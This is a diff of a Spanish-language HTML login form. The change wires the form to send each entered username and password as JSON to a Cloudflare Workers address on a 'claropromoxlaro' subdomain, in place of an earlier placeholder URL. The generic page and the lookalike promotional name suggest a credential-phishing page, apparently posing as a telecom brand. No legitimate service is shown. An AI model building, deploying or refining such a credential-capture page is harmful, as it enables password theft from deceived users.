@@ -1,41 +1,45 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Login</title>
 </head>
 <body>
-  <h2>Login</h2>
+  <h2>Formulario de Login</h2>
+
   <form id="loginForm">
-    <label>Usuario: <input type="text" id="usuario" required></label><br><br>
-    <label>Clave: <input type="password" id="clave" required></label><br><br>
-    <button type="submit">Iniciar sesión</button>
+    <label>Usuario: <input type="text" name="usuario" required></label><br><br>
+    <label>Clave: <input type="password" name="clave" required></label><br><br>
+    <button type="submit">Enviar</button>
   </form>
 
-  <p id="estado"></p>
+  <p id="resultado"></p>
 
   <script>
+    const WORKER_URL = "https://blue-night-7897.claropromoxlaro.workers.dev/login";
+
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
-      const usuario = document.getElementById("usuario").value;
-      const clave = document.getElementById("clave").value;
-      const transactionId = crypto.randomUUID();
+
+      const form = e.target;
+      const data = {
+        usuario: form.usuario.value,
+        clave: form.clave.value,
+        transactionId: crypto.randomUUID()
+      };
 
       try {
-        const resp = await fetch("https://TU-WORKER-URL/login", {
+        const res = await fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ usuario, clave, transactionId })
+          body: JSON.stringify(data)
         });
 
-        const data = await resp.json();
-        if (data.ok) {
-          document.getElementById("estado").textContent = "✅ Login enviado correctamente.";
-        } else {
-          document.getElementById("estado").textContent = "⚠️ Error: " + (data.error || "desconocido");
-        }
+        if (!res.ok) throw new Error("Error HTTP " + res.status);
+        const json = await res.json();
+        document.getElementById("resultado").textContent = "✅ Enviado: " + JSON.stringify(json);
       } catch (err) {
-        document.getElementById("estado").textContent = "❌ Error de conexión: " + err.message;
+        document.getElementById("resultado").textContent = "❌ Error de conexión: " + err.message;
       }
     });
   </script>
